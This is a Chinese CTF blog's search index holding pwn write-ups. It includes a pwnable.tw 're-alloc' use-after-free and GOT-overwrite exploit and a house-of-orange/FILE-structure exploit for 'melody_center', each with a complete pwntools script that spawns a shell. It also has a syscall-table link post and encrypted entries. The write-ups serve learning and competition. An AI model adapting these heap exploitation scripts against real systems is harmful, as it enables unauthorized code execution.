<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn heap: re-alloc</title>
      <link href="/2020/03/06/pwn-heap-re-alloc/"/>
      <url>/2020/03/06/pwn-heap-re-alloc/</url>
      
        <content type="html"><![CDATA[<p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>题目提供了四个功能</p><pre><code>1. alloc2. realloc3. free4. exit</code></pre><p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p><h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><blockquote><p>libc2.29的tcache double free的检测机制</p></blockquote><pre><code class="C">//glibc-2.27typedef struct tcache_entry{  struct tcache_entry *next;} tcache_entry;//glibc-2.29typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;</code></pre><p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p><pre><code class="C">//glibc-2.27tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;}//glibc-2.29tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;    //new  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = NULL;    //new  return (void *) e;}</code></pre><p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p><blockquote><p>realloc(ptr, size)函数</p></blockquote><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size &lt;= old_size</code>: edit(ptr)</li><li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr);</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li><li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li><li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li><li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))bss = elf.bss(0)atoll_got = elf.got[&quot;atoll&quot;]atoll_plt = elf.plt[&quot;atoll&quot;]printf_plt = elf.plt[&quot;printf&quot;]libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 0xebsystem_offset = libc.symbols[&quot;system&quot;]# let tcache[0x20] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x18, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x18, p64(atoll_got))alloc(1, 0x18, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x38, &quot;CCC&quot;)free(0)realloc(1, 0x38, &quot;D&quot; * 0x10)free(1)# let tcache[0x50] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x48, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x48, p64(atoll_got))alloc(1, 0x48, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x58, &quot;CCC&quot;)free(0)realloc(1, 0x58, &quot;D&quot; * 0x10)free(1)# above all, we get two tcache point to atoll_got that can be malloc# alloc once at heap[0]# change the atoll_got to printf_plt# use format string bug to leak the __libc_start_main_ret in the stackalloc(0, 0x48, p64(printf_plt))p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;%21$llx&quot;)libc_start_main_ret = int(p.recv(12), 16)libc_base = libc_start_main_ret - libc_start_main_ret_offsetlibc_system = libc_base + system_offset# alloc twice at heap[1]# since the atoll has been set to printf# the return value of printf(which may be the length of the string) will be regarded as the &quot;Index&quot;# thus we use length of the string to make &quot;atoll&quot; work# then we change the atoll_got to libc_systemp.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;A\x00&quot;)p.sendafter(&quot;Size:&quot;, &quot;A&quot; * 15 + &quot;\x00&quot;)p.sendafter(&quot;Data:&quot;, p64(libc_system))# input &quot;/bin/sh\x00&quot; and call system(atoll) to get shellp.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;/bin/sh\x00&quot;)success(&quot;libc_start_main_ret: &quot; + hex(libc_start_main_ret))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li><li>调试的时候gef好像有点问题，peda可以用。</li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li><li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ed7cc47cfd4c2c4809f59bfc05eb6a570d9e976c2cdaffaeda33bcf0a7503efe"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a><br><br><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2e033ed4cf72f94c12d94063f8d6abcdfd40c96ed73ea9d0746c11be62f5a216">1abbbc9bbb000e644efdb654879f12220bbbf4c342858fc9b2d928f00267d19b2af08ff847a7fd226f76e946514c996832eb4b552f293183335206ed7638ff79968184cc80358edb0820e6aa93b9417abfbb517ee384d9a3272df7a273c6329def4501e34542c0047a2ed77b394405d173f41705031d18db75abac173c280a06a12fac25c8c4ff456f402775b9d0123f822ec470588dd0ee2e49cb04cc0b3ba5df153da9dd13f8c8ab14e43c41fafca84d6d062e14b19c37bd7960cc0c1ab4cef14b72d30360dadce02c215d9d1ce2dcc4a38b28bb5adb1569c814097c8dd75f18728399b4e888f209360b729c2ff011f3c3eee4cf561e9e82fae7ba138c44cd324ab90598174eab0d509d0aa660acdf795e72eb8d1ea57ac6a3d621d35d138a4e912b4122e718856725763e968d4857be819a68a2873675333982d2523a2cff2fae29eb660ee6238a6592d72c921559ecd5b9d67f3a3d1cb7288a42b8c6452c338084f4cfeb9c548150cbde52e120f261109f4da1364bb83c8545d31e88d38532e6a5c16fb248db5f0527f6dcf345f125e3b04c53aa26054d43a8127eaa6cbd2bef557127be8292287dd87f22969b7ed72b4378f35e07fb01e14569247fe96e158c7cc5b7dac4ca6bb682198bbe88bb10edde28dbb5c1bf27d4eeb8c46288ae217068ff0a6e50718d674db362c2014926e6866e133e3d49e108cf31eb9af94a466018eeb7b4ec6b0da041c74a0c411d908673edd6732a50d2a2114a984710a4c1ff76d2a3e829f9c46b28e84f61cfbfb504058e54ecaf4b9880e03fdbb36fe03616557ea00b26dc9e2602411370fdb4035aa625130b8dac42971afb47dd49644f9c1aa4b4d71b2584870ddfd12e1970544dbd5914e9e5aa9250cdfaa9d43a4afd57557d9e68b70b8fb1cf9b5728a0d8d6f5860b20ce92eecf7d8a73e14a6fc6d241ec441b75d6d8f58223ced44ba426ad5bee54a4cadb9ec6062c8c13067f06f3a0474ace5cb00529e761d3c02628dd7b6fac5f9339af99acfb3165f514b5e00dda75a1fc3913fadee3707dd2f16a26c3f877e83bc84c795a7685a0ec9bd375d7edaec10780a9af4fe4222b590bf493cb87d7918c924a70d59e50d26bbe42bc7a92a49b971d97467d487a7a300c69ed6caffcb58b6673b2dc999fb83f73d29fa1ba5e2e36c7722141e86f8777997d78e43df45f2cdf1ad2c7ba296a068b7f666625ee8a6e50a6638c85e972baa82fa4ae32b16712d7c5fa22895b513b900b69d0d746182d31ef466d86e1950a31b9d20cd8b49993282c69f195454154ea465ab9408171510e9792b165b171007c84edd9ba3dcbed197d4869e532e9064f4e91987e48f865cdf9d874494a2020efe3b87d5218258dccf8c264e1285d6ffa6efcdbd0ac769a4282613737b76afab158f466812a7f77e1dab55ebdec687ff88ff32e665d1fb1816c5d81ef6a4c21ad85ef26221edc67e0f5ddb1484750107d33601a652f809a31ae28e6d64904ed49d44a07232dbc99fd4af07f521fad29a6664602d5901b66338ec6673d8fb78fb21e6332395ace78a9ad60fc3c5429fc92c584d91a226f6b40c1f8894c88fffdcd336d8b8e17388e2add8954a9bbf67c55e8316b081f57a9439571aeded196cb36f27b7aeaedf528afdad4f8c5ee292883f661c2b59d4b54d01851b134295f8476ed2d49587c2ba52aaa098cfaad14dbc0bd2630843212913e91b85e6a873816e88cd340143475dcda7fb669e38c3a3eb668215c26b223ee2d53ca2704df71838c1d5079dd5d9eb20b451eda2969dfb8dc414debfadb39eb73d4325630a4c35fb9637518c8890730640d99892850ccb48503f3e43bd02e03e8002e19ddfd086c2a19b972e56b3ff1a7db5c9ae114a8e075c1f7e268eb290e261180f10f9b713d030a408ad46e55f3b624e016ac2d3613375daaa981ffc8e7400dfa7db6f7474cdeabe3035dabdf2c41f8bdde8aca4f6a9d563ffce7e6135bf72641ba35b2a5c29193791ff127afe061ddeeef88d5b1e901965e3ffa99576692b2f681aabcb4067729a5c07a1098227fcef28139235b58a9201003f09e09bc2642fa84db36d51b7317ba826c9829e5dea37d58b517d9e067a24ebff66e47154cace057b50e065298585a32d6a763126bb49cfc13de9a9aa17b6211483639332a181fa04f4062f80f1a4caf1c7696ff3e9177af51af1bf7feb62718ffc3c0d15aed62dd1fd3930de679a71bf9133b08beb70c583de154a211cd9346d75cd1ecf5ee5d81c4cdb9ca9e6968c9b8d28edb6893845648222d6171d76ecbf73504b7a18563808a3cdd520e5c9ebbd83b0769506678b371d231a584eabadad269dfe50257bd65379d33f793a06a617dac53e50a686f395b433b6b873c93475bd2908fab8f5d92f384665e63cfa8e2cecf129775fb87615e4ba9a21f9abae26fa4d9942fe24b51e3f530c758700449cf3fb55ab8cb3ba7d8043036d755647ee98904297c8d485811cf35778387b15327080167be88b972192f5c633b3e15d39c0cf6eb2baab8bef90c17e16aed156ff882cd7963fce55849b0261bd52ea9d5cea667a5a49485d0bbb7fb1e3053672d0d312e119bdfe6db008d7f419544702ee0afb883079e7ba1f9897376c098322dc0d7584d59aa0a8ad0d4ef4d5e3032bb8542062d60e0fde627de0de2f1b3fc809ddb775e03cfcd1cfd498a4f8983ff5b5e1c36cfeb72cefb6035c0e2cb52dc2c01c03dcec309e7ef757ae9807b7eb708b1c3374983e6d3833201274eb8e945f1a6c021b01563ad3857a2723652d82c28683b6bf0708a58431d6f5500bd1aa8d5f98ae36e0b4f78365c719341dd9d0423b86b9311f82ec3109f6bdb3f657b6d29440290174e9953db82bd653dcb3daa0f0ea78a270023eef038d52dd3d8bd8532cffb428b0e152b2b2d32fa5e10117e9f112054950b065a926f891a21c34c064fad51c720602736e481e03277b3da5c3be9b6511254225a9c0df89ad5530cb9f3525301756e779deb6afad9daa5680040c1d265c76bcd08613709496e1febfc1c4a8e0c9eb4644741c3a5d381ae6e8792e56a58a9e2e93b088fc8ab74e695cedce661d41f0ecdd10e13532782a3b1553372ed6e0c7d30ef229c2faf2bb5947fdf41c9727b9cd17866d265942d9f245bddc47dddd58202fd3aafc94e35b4ec915412ecfc17e44c6ce87045d21b0f1fead5870cee5ba4daec18a1e5523814197fe637a96cfa82910303e7c822d7bb9012dab544af22070281e1fb3ef5bc7d3ef0bef3a789aa1127649d1ea53e516aa3c8af79cf4a09e38668226198d7b31b2ed6c6e6153907e0ad54e26df1662840e625130a18aedf60dd724efc8924c7ba7aa158999c1430095e97d371a814825b7516577c338664d2b6ba8ff8ace526445001ec978a77e8cd5bbf1a8054471969d14fefe7e799d639312ddf1ae6f1a115d117d1191f4511f5f1dcb5109f017cdc5dfdad76768d60c82d83a3e69d4afd8425e9f1b6a5c8c1140abe0eb007237e57fe5725280557940a6290e79d529d0495e2c00908a16ea2aa60c1f883c492ef2068ac2844f7c59d448687737de0382cc273501ebb28207121d4fe1f29be5a78e7edd841c0e319853f623c6a952afe40bb0f9139fd1c83e3b67f5ed0addaff6538709ba8e584196ee44eba4b61e6cd96d3ed96a446dac51764ba26f293d03e13b0446593f27edc9a60acfc5b297c1ba9740684a0ea04dba840375efa4d67e72a26c19ed934ea3cf1ef0a9541bffc6bab66a6e836fdf65f41d81d19b1c37f3eb13b67cea5ed0d063fd36003d2466bf05dc85bd5ee782eab5fd3cbfa7d1b517f5a79abf33d5edfc500c85ab19aa59d248fdd114bb6c1aa77000273d426b515f24cbaa5b14fd0d39afd9ca736e7ea4590a9e3024573a6d589d4e47dddb9760057e0a98367e3f4ec28356dc46af5644a850bf1a91c7b6cf718925cdc4019f6a5a116d8a2cd9c2a812ec741e337e2c950e8aec4d7389c36cc5c9075c245657459f178caea6a5f040d30305fc150dc0f5abcde880928071050600195a5a1231469352c7e3e1e7af103e946a9edbd1e68259e09c327dee214de5d99d0210e61138eeb3ecd064a08e4bad1080c4e39d9cb23e2c4ad78275f996a69137f49edc45cc4b88379ffa95b67c61899c3fd1ff928a53ea3d0144740f3db9a4234e79d372a72663e7579cb623bec2d26e3e5ee94beb1cb2d5b53cfb64